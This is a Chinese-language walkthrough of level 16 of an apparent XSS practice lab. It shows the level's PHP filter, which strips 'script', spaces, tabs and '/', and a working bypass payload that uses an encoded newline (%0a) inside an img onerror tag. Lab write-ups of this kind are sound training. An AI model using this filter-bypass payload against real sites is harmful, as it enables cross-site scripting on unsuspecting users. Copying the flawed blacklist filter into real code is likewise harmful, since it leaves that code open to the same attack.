# Level 16 — 空格过滤绕过（%0a 换行）

## 发现过程

万能探针扔进去，`<>` 活着但空格被干掉了。试了 `%0d` `%09` 都不行，看源码发现过滤了空格和 Tab，但没杀换行符。
![](99_Attachments/图片/level16/file-20260623193216679.png)
## 源码

```php
$str = strtolower($_GET["keyword"]);          // 全小写
$str2 = str_replace("script","&nbsp;",$str);  // 杀 script
$str3 = str_replace(" ","&nbsp;",$str2);      // 杀空格
$str4 = str_replace("/","&nbsp;",$str3);      // 杀 /
$str5 = str_replace("	","&nbsp;",$str4);  // 杀 Tab
echo "<center>".$str5."</center>";
```

输出位置在标签内容区，不在属性里，所以得写完整标签。

## Payload

```
<img%0asrc=1%0aonerror=alert(1)>
```


![](99_Attachments/图片/level16/file-20260623193157021.png)
`%0a`（换行符）代替空格，浏览器当空白解析。拼出来就是 `<img src=1 onerror=alert(1)>`。

## 要点

- 空格过滤不光 `%20`，Tab `%09` 和 `/` 也杀了
- 换行符 `%0a` 活着一路到底
- 输出在标签内容区 → 需要完整标签，不能只写事件
